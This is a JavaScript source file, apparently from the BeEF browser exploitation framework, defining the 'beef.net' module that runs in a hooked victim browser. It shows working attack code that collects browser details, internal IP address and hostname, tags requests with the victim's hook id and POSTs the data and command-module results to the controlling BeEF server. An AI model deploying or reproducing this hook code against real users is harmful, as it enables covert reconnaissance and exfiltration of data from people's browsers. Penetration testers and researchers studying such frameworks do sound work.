/*!
 * @literal object: beef.net
 *
 * Provides basic networking functions.
 */
beef.net = {
	
	beef_url: "<%= @beef_url %>",
	beef_hook: "<%= @beef_hook %>",	
	
	/**
	 * Gets an object that can be used for ajax requests.
	 * 
	 * @example: var http = beef.net.get_ajax();
	 */
  	get_ajax: function() {
		
		// try objects
		try {return new XMLHttpRequest()} catch(e) {};
	    try {return new ActiveXObject('Msxml2.XMLHTTP')} catch(e) {};
	    try {return new ActiveXObject('Microsoft.XMLHTTP')} catch(e) {};
	
		// unsupported browser
		console.log('You browser is not supported')
		console.log('please provide details to dev team')
		return false;
	},
	
	/**
	 * Build param string from hash.
	 */
	construct_params_from_hash: function(param_array) {
		
		param_str = "";
		
		for (var param_name in param_array) {
			param_str = this.construct_params(param_str, param_name, param_array[param_name])
		}
		
		return param_str;
	},
	
	/**
	 * Build param string.
	 */
	construct_params: function(param_str, key, value) {
		
		// if param_str is not a str make it so
		if (typeof(param_str) != 'string') param_str = '';
		
		if (param_str != "" ) { param_str += "&"; } // if not the first param add an '&'
		param_str += key;
		param_str += "=";
		param_str += beef.encode.base64.encode(value);
		
		return param_str;
	},
	
	/**
	 * Performs http requests.
	 * @param: {String} the url to send the request to.
	 * @param: {String} the method to use: GET or POST.
	 * @param: {Function} the handler to callback once the http request has been performed.
	 * @param: {String} the parameters to send for a POST request.
	 * 
	 * @example: beef.net.raw_request("http://beef.com/", 'POST', handlerfunction, "param1=value1&param2=value2");
	 */
	raw_request: function(url, method, handler, params) {
		var http;
		var method = method || 'POST';
		var params = params || null;		
		var http = this.get_ajax() || null;

		http.open(method, url, true);
			
		if(handler) {
			http.onreadystatechange = function() {
				if (http.readyState == 4) handler(http.responseText);
			}
		}
			
		http.send(params);

	},
	
	/**
	 * Performs http requests with browoser id.
	 * @param: {String} the url to send the request to.
	 * @param: {String} the method to use: GET or POST.
	 * @param: {Function} the handler to callback once the http request has been performed.
	 * @param: {String} the parameters to send for a POST request.
	 * 
	 * @example: beef.net.request("http://beef.com/", 'POST', handlerfunction, "param1=value1&param2=value2");
	 */
	request: function(url, method, handler, params) {
		params += '&BEEFHOOK=' + BEEFHOOK; // append browser id
		this.raw_request(url, method, handler, params);
	},
	
	/**
	 * Send browser details back to the framework. This function will gather the details 
	 * and send them back to the framework
	 * 
	 * @example: beef.net.sendback_browser_details();
	 */
	sendback_browser_details: function() {
		// get hash of browser details
		var details = beef.browser.getDetails();
		
		// grab the internal ip address and hostname
		var internal_ip = beef.net.local.getLocalAddress();
		var internal_hostname = beef.net.local.getLocalHostname();
		
		if(internal_ip && internal_hostname) {
			details['InternalIP'] = internal_ip;
			details['InternalHostname'] = internal_hostname;
		}
		
		// contruct param string
		var params = this.construct_params_from_hash(details);
		
		// return data to the framework
		this.sendback("/init", 0, params);
	},
	
	/**
	 * Sends results back to the BeEF framework.
	 * @param: {String} The url to return the results to.
	 * @param: {Integer} The command id that launched the command module.
	 * @param: {String/Object} The results to send back.
	 * @param: {Function} the handler to callback once the http request has been performed.
	 * 
	 * @example: beef.net.sendback("/commandmodule/prompt_dialog.js", 19, "answer=zombie_answer");
	 */
	sendback: function(commandmodule, command_id, results, handler) {
		if(typeof results == 'object') {
			s_results = '';
			
			for(key in results) {
				s_results += key + '=' + escape(results[key].toString()) + '&';
			}
			
			results = s_results;
		}
		
		if(typeof results == 'string' && typeof command_id == 'number') {
			results += '&command_id='+command_id;
			this.request(this.beef_url + commandmodule, 'POST', handler, results);
		}
	}
	
};

beef.regCmp('beef.net');